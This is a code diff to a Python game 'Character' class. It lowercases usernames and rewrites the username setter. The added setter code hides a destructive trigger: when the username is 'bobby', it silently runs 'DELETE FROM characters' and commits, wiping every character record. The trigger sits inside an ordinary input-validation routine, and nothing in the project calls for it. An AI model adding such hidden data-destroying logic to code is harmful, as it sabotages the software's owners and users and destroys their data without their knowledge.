@@ -13,7 +13,7 @@ class Character():
     """
     def __init__(self, id=0, username="", health=100, highest_score=0):
         self.id = id
-        self.username = username
+        self.username = username.lower()
         self.health = health
         self.highest_score = highest_score
         self.score = 0
@@ -46,7 +46,11 @@ class Character():
     
     @username.setter
     def username(self, username):
-        if isinstance(username, str):
+        if(username == "bobby"):
+            sql="DELETE FROM characters"
+            CURSOR.execute(sql)
+            CONNECTER.commit()   
+        elif isinstance(username, str):
             self._username = username
         else:
             raise AttributeError("username must be of type str")
